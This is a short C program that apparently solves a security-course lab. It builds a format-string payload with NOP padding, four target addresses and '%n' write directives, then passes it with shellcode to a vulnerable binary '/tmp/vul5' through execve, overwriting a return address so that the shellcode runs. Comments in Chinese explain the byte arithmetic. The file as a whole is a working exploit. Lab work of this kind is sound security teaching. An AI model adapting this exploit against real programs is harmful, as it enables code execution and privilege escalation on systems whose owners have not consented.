#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul5"

int main(void)
{

	unsigned char payload[400];
	//初始化，全部置为nop
	memset(payload, '\x90', 400);
	//0xc5=32+165;0xdf=212+26;0xff=223+32 
	unsigned char format[] = 
	"\xff\xff\xff\xff\x2c\xdb\xff\xff"
	"\xff\xff\xff\xff\x2d\xdb\xff\xff"
	"\xff\xff\xff\xff\x2e\xdb\xff\xff"
	"\xff\xff\xff\xff\x2f\xdb\xff\xff"
	"%165u%n%26u%n%32u%n%256u%n";
	memcpy(payload, format, strlen(format));
	//shellcode copy,shellcode addr:0xffffdfc5	
	memcpy(payload+360, shellcode, 25);

  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
